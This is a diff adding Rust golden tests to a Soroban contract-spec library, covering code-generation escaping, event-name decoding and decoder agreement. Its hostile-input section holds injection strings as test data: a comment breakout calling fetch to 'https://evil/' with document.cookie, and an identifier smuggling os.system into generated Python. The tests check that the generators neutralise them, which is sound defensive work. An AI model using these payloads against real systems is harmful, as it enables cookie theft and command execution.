@@ -21,7 +21,7 @@
 //! 3. `enrich_*`— ContractSpec::enrich_event on decoded topics/value
 //! 4. `udt_*`   — ContractSpec::relabel_value for struct/enum/union results
 
-use lumenqraph_core::xdr::decode_scval_base64;
+use lumenqraph_core::xdr::{decode_scval, decode_scval_base64, event_name_from_topic};
 use lumenqraph_core::ContractSpec;
 use serde_json::json;
 use stellar_xdr::curr::{
@@ -672,4 +672,300 @@ fn udt_unknown_type_returns_value_unchanged() {
     });
     let raw = json!(42);
     assert_eq!(spec.relabel_value(&raw, &ty), raw);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// 5. HOSTILE CODEGEN INPUT GOLDEN TESTS (#606, #607)
+// ═══════════════════════════════════════════════════════════════════════════
+
+/// Doc strings that try to break out of generated comments / docstrings.
+const HOSTILE_DOCS: &[&str] = &[
+    "x */ fetch(\"https://evil/\"+document.cookie); /*",
+    "line one\nline two\nline three",
+    "unicode\u{2028}separator\u{2029}paragraph",
+    "ends with a quote \"",
+    "ends with a backslash \\",
+    "triple \"\"\" quote",
+    "\\N{BULLET} escape",
+];
+
+/// Identifiers that try to inject statements into generated modules.
+const HOSTILE_NAMES: &[&str] = &[
+    "x): import os; os.system(\"id\")  # ",
+    "a-b",
+    "1leading",
+    "with space",
+    "*/",
+    "class",
+];
+
+/// Build a spec whose docs and names are all hostile.
+fn hostile_spec() -> ContractSpec {
+    let mut entries: Vec<ScSpecEntry> = Vec::new();
+
+    for (i, doc) in HOSTILE_DOCS.iter().enumerate() {
+        let name = format!("fn{i}");
+        entries.push(ScSpecEntry::FunctionV0(ScSpecFunctionV0 {
+            doc: (*doc).try_into().unwrap(),
+            name: sym(&name),
+            inputs: vec![ScSpecFunctionInputV0 {
+                doc: (*doc).try_into().unwrap(),
+                name: HOSTILE_NAMES[i % HOSTILE_NAMES.len()].try_into().unwrap(),
+                type_: ScSpecTypeDef::I128,
+            }]
+            .try_into()
+            .unwrap(),
+            outputs: vec![ScSpecTypeDef::Void].try_into().unwrap(),
+        }));
+    }
+
+    for (i, doc) in HOSTILE_DOCS.iter().enumerate() {
+        entries.push(ScSpecEntry::UdtEnumV0(ScSpecUdtEnumV0 {
+            doc: (*doc).try_into().unwrap(),
+            lib: "".try_into().unwrap(),
+            name: format!("Enum{i}").try_into().unwrap(),
+            cases: vec![ScSpecUdtEnumCaseV0 {
+                doc: (*doc).try_into().unwrap(),
+                name: HOSTILE_NAMES[i % HOSTILE_NAMES.len()].try_into().unwrap(),
+                value: i as u32,
+            }]
+            .try_into()
+            .unwrap(),
+        }));
+    }
+
+    for (i, doc) in HOSTILE_DOCS.iter().enumerate() {
+        entries.push(ScSpecEntry::UdtStructV0(ScSpecUdtStructV0 {
+            doc: (*doc).try_into().unwrap(),
+            lib: "".try_into().unwrap(),
+            name: format!("Struct{i}").try_into().unwrap(),
+            fields: vec![ScSpecUdtStructFieldV0 {
+                doc: (*doc).try_into().unwrap(),
+                name: HOSTILE_NAMES[i % HOSTILE_NAMES.len()].try_into().unwrap(),
+                type_: ScSpecTypeDef::I128,
+            }]
+            .try_into()
+            .unwrap(),
+        }));
+    }
+
+    ContractSpec::from_spec_xdr_simple(&spec_bytes(&entries)).expect("hostile spec must parse")
+}
+
+/// Assert that no `*/` appears inside a generated block comment, i.e. every
+/// `/*` is closed exactly once by the matching `*/` and nothing in between can
+/// terminate the comment early.
+fn assert_block_comments_inert(src: &str, lang: &str) {
+    let mut rest = src;
+    while let Some(start) = rest.find("/*") {
+        let after = &rest[start + 2..];
+        let end = after
+            .find("*/")
+            .unwrap_or_else(|| panic!("{lang}: unterminated block comment"));
+        let body = &after[..end];
+        assert!(
+            !body.contains("*/"),
+            "{lang}: nested comment terminator inside block comment body: {body:?}"
+        );
+        rest = &after[end + 2..];
+    }
+}
+
+/// TypeScript output must not let a hostile doc close the `/** … */` comment.
+#[test]
+fn codegen_ts_hostile_docs_are_inert() {
+    let spec = hostile_spec();
+    let ts = spec.to_typescript();
+    assert_block_comments_inert(&ts, "ts");
+    // The raw injection payload must never appear verbatim at top level.
+    assert!(
+        !ts.contains("fetch(\"https://evil/\"+document.cookie)"),
+        "ts: injection payload leaked into output"
+    );
+}
+
+/// Python output must not let a hostile doc close the `\"\"\"…\"\"\"` docstring.
+#[test]
+fn codegen_py_hostile_docs_are_inert() {
+    let spec = hostile_spec();
+    let py = spec.to_python();
+    // Count triple quotes: they must all pair up.
+    let triples = py.matches("\"\"\"").count();
+    assert_eq!(triples % 2, 0, "py: unbalanced triple quotes in output");
+    assert!(
+        !py.contains("import os; os.system"),
+        "py: injection payload leaked into output"
+    );
+}
+
+/// Rust output must not let a hostile doc close the `/** … */` comment.
+#[test]
+fn codegen_rust_hostile_docs_are_inert() {
+    let spec = hostile_spec();
+    let rs = spec.to_rust();
+    assert_block_comments_inert(&rs, "rs");
+}
+
+/// Hostile identifiers must be sanitised to valid identifiers in every target.
+#[test]
+fn codegen_hostile_names_are_sanitised() {
+    let spec = hostile_spec();
+    for (lang, src) in [
+        ("ts", spec.to_typescript()),
+        ("py", spec.to_python()),
+        ("rs", spec.to_rust()),
+    ] {
+        assert!(
+            !src.contains("os.system"),
+            "{lang}: hostile identifier leaked into output"
+        );
+        assert!(
+            !src.contains("import os"),
+            "{lang}: hostile identifier leaked into output"
+        );
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// 6. EVENT NAME FROM TOPIC GOLDEN TESTS (#609)
+// ═══════════════════════════════════════════════════════════════════════════
+
+/// A symbol first topic yields the event name.
+#[test]
+fn event_name_symbol_topic() {
+    // ScVal::Symbol("transfer")
+    assert_eq!(
+        event_name_from_topic("AAAADwAAAAh0cmFuc2Zlcg==").as_deref(),
+        Some("transfer")
+    );
+}
+
+/// An address first topic must not be treated as an event name.
+#[test]
+fn event_name_address_topic_is_none() {
+    let b64 = "AAAAEgAAAAAAAAAAZnYwtpgeUB4mlva1EnnCVBm0hGxbz5B5Zl89BaJLufM=";
+    assert_eq!(event_name_from_topic(b64), None);
+}
+
+/// A u64 first topic must not be treated as an event name.
+#[test]
+fn event_name_u64_topic_is_none() {
+    // ScVal::U64(12345) — tag=5, value=12345
+    let b64 = "AAAABQAAAAAAAAAAADA5";
+    assert_eq!(event_name_from_topic(b64), None);
+}
+
+/// A bytes first topic must not be treated as an event name.
+#[test]
+fn event_name_bytes_topic_is_none() {
+    // ScVal::Bytes([0xde, 0xad]) — tag=13, len=2, padded
+    let b64 = "AAAAEQAAAAIAAAAAAAAA3q0=";
+    assert_eq!(event_name_from_topic(b64), None);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// 7. DECODER EQUIVALENCE GOLDEN TESTS (#608)
+// ═══════════════════════════════════════════════════════════════════════════
+
+/// Table-driven check: for each ScVal, the typed decoder and the byte decoder
+/// must produce identical JSON.
+#[test]
+fn decoder_paths_agree_on_representative_scvals() {
+    use stellar_xdr::curr::{
+        AccountId, ContractId, Hash, LedgerKeyNonce, PublicKey, ScAddress, ScBytes, ScContractInstance,
+        ScError, ScErrorCode, ScErrorType, ScNonceKey, ScString, ScSymbol as XSymbol, ScVal,
+        UInt256,
+    };
+
+    let mut cases: Vec<ScVal> = Vec::new();
+
+    // Error variant.
+    cases.push(ScVal::Error(ScError::Contract(7)));
+    cases.push(ScVal::Error(ScError::WasmVm(ScErrorCode::InvalidAction)));
+    cases.push(ScVal::Error(ScError::Context(ScErrorCode::MissingValue)));
+    cases.push(ScVal::Error(ScError::Storage(ScErrorCode::ExceededLimit)));
+    cases.push(ScVal::Error(ScError::Object(ScErrorCode::UnexpectedType)));
+    cases.push(ScVal::Error(ScError::Value(ScErrorCode::InvalidInput)));
+    cases.push(ScVal::Error(ScError::Auth(ScErrorCode::InvalidAction)));
+    cases.push(ScVal::Error(ScError::Budget(ScErrorCode::ExceededLimit)));
+    cases.push(ScVal::Error(ScError::Type(ScErrorType::Contract)));
+
+    // Invalid UTF-8 string.
+    cases.push(ScVal::String(ScString(
+        vec![0xff, 0xfe, 0x00, 0x41].try_into().unwrap(),
+    )));
+
+    // LedgerKeyNonce.
+    cases.push(ScVal::LedgerKeyNonce(ScNonceKey { nonce: 42 }));
+
+    // ContractInstance.
+    cases.push(ScVal::ContractInstance(ScContractInstance {
+        executable: stellar_xdr::curr::ContractExecutable::Wasm(Hash([7u8; 32])),
+        storage: None,
+    }));
+
+    // I256 / U256.
+    cases.push(ScVal::I256(stellar_xdr::curr::Int256Parts {
+        hi_hi: 0,
+        hi_lo: 0,
+        lo_hi: 0,
+        lo_lo: 1234,
+    }));
+    cases.push(ScVal::U256(UInt256 {
+        hi_hi: 0,
+        hi_lo: 0,
+        lo_hi: 0,
+        lo_lo: 1234,
+    }));
+
+    // A few primitives for good measure.
+    cases.push(ScVal::Bool(true));
+    cases.push(ScVal::Void);
+    cases.push(ScVal::U32(7));
+    cases.push(ScVal::I128(stellar_xdr::curr::Int128Parts { hi: 0, lo: 300 }));
+    cases.push(ScVal::Symbol(XSymbol("fee".try_into().unwrap())));
+    cases.push(ScVal::Bytes(ScBytes(vec![0xde, 0xad].try_into().unwrap())));
+    cases.push(ScVal::Address(ScAddress::Account(AccountId(
+        PublicKey::PublicKeyTypeEd25519(stellar_xdr::curr::Uint256([3u8; 32])),
+    ))));
+
+    // Silence unused import warnings for types only used in comments.
+    let _ = LedgerKeyNonce { nonce: 0 };
+
+    for v in cases {
+        let bytes = v.to_xdr(Limits::none()).unwrap();
+        let b64 = base64_encode(&bytes);
+        let typed = decode_scval(&v);
+        let byte = decode_scval_base64(&b64);
+        assert_eq!(
+            typed, byte,
+            "decoder paths disagree for {v:?} (b64={b64})"
+        );
+    }
+}
+
+/// Minimal base64 encoder so the test does not depend on a crate feature.
+fn base64_encode(input: &[u8]) -> String {
+    const ALPHABET: &[u8; 64] =
+        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    let mut out = String::new();
+    for chunk in input.chunks(3) {
+        let b0 = chunk[0] as u32;
+        let b1 = *chunk.get(1).unwrap_or(&0) as u32;
+        let b2 = *chunk.get(2).unwrap_or(&0) as u32;
+        let n = (b0 << 16) | (b1 << 8) | b2;
+        out.push(ALPHABET[((n >> 18) & 0x3f) as usize] as char);
+        out.push(ALPHABET[((n >> 12) & 0x3f) as usize] as char);
+        if chunk.len() > 1 {
+            out.push(ALPHABET[((n >> 6) & 0x3f) as usize] as char);
+        } else {
+            out.push('=');
+        }
+        if chunk.len() > 2 {
+            out.push(ALPHABET[(n & 0x3f) as usize] as char);
+        } else {
+            out.push('=');
+        }
+    }
+    out
 }
